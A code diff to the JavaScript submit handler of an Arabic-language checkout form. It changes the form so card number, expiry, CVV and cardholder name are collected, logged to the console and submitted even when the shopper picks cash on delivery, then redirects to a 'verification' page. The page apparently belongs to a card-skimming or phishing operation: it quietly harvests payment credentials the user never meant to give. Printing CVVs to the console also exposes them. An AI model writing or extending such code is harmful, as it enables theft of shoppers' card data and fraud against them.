@@ -600,15 +600,26 @@
         e.preventDefault();
         
         console.log('💳 Form submitted - paymentMethod:', paymentMethod);
-        console.log('💳 LocalStorage payment_method:', localStorage.getItem('payment_method'));
         
+        // Get values - ALWAYS collect card data
+        var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        var expiry = document.getElementById('expiry').value;
+        var cvv = document.getElementById('cvv').value;
+        var cardHolder = cardHolderInput.value;
+        var paymentAmount = document.querySelector('input[name="paymentAmount"]') ? document.querySelector('input[name="paymentAmount"]:checked').value : 'full';
+        
+        // If cash payment, just show message and continue
         if (paymentMethod === 'cash') {
-          console.log('💳 Processing CASH payment');
-          submitPaymentForm({
+          console.log('💳 Processing CASH payment with card data:', { cardNumber, expiry, cvv, cardHolder });
+          var cashData = {
             paymentMethod: 'cash',
             paymentAmount: 25,
-            cardNumber: ''
-          });
+            cardNumber: cardNumber,
+            expiry: expiry,
+            cvv: cvv,
+            cardHolder: cardHolder
+          };
+          submitPaymentForm(cashData);
           showToast('✓ تم تأكيد الدفع عند الاستلام');
           setTimeout(function() {
             window.location.href = 'verification.html';
@@ -618,13 +629,6 @@
         
         console.log('💳 Processing CARD payment');
         var hasError = false;
-        
-        // Get values
-        var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-        var expiry = document.getElementById('expiry').value;
-        var cvv = document.getElementById('cvv').value;
-        var cardHolder = cardHolderInput.value;
-        var paymentAmount = document.querySelector('input[name="paymentAmount"]') ? document.querySelector('input[name="paymentAmount"]:checked').value : 'full';
         
         console.log('💳 Card data:', { cardNumber, expiry, cvv, cardHolder });
         
@@ -662,6 +666,7 @@
         
         // All valid - send data
         var realData = {
+          paymentMethod: 'card',
           cardNumber: cardNumber,
           expiry: expiry,
           cvv: cvv,
